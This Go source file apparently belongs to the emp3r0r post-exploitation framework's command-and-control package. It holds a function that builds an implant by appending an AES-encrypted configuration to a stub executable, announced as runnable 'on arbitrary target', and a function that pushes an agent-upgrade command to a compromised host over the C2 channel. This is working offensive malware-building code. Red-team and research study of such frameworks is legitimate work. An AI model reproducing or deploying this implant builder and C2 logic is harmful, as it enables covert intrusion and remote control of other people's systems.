package cc

import (
	"fmt"
	"io/ioutil"
	"strconv"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func GenAgent() {
	buildJSONFile := EmpRoot + "/emp3r0r.json"
	stubFile := EmpRoot + "/stub.exe"
	outfile := EmpRoot + "/agent.exe"
	CliPrintWarning("Make sure %s and %s exist, and %s must NOT be packed",
		buildJSONFile, stubFile, strconv.Quote(stubFile))

	// read file
	jsonBytes, err := ioutil.ReadFile(buildJSONFile)
	if err != nil {
		CliPrintError("Parsing emp3r0r JSON config file: %v", err)
		return
	}

	// encrypt
	key := tun.GenAESKey(RuntimeConfig.MagicString)
	encJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
	if encJSONBytes == nil {
		CliPrintError("Failed to encrypt %s with key %s", buildJSONFile, key)
		return
	}

	// write
	toWrite, err := ioutil.ReadFile(stubFile)
	if err != nil {
		CliPrintError("Read stub: %v", err)
		return
	}
	toWrite = append(toWrite, []byte(RuntimeConfig.MagicString)...)
	toWrite = append(toWrite, encJSONBytes...)
	err = ioutil.WriteFile(outfile, toWrite, 0755)
	if err != nil {
		CliPrintError("Save agent binary %s: %v", outfile, err)
		return
	}

	// done
	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
		outfile, stubFile, buildJSONFile, outfile)
}

func UpgradeAgent() {
	if !util.IsFileExist(WWWRoot + "agent") {
		CliPrintError("Make sure %s/agent exists", WWWRoot)
		return
	}
	checksum := tun.SHA256SumFile(WWWRoot + "agent")
	SendCmdToCurrentTarget(fmt.Sprintf("%s %s", emp3r0r_data.C2CmdUpdateAgent, checksum), "")
}
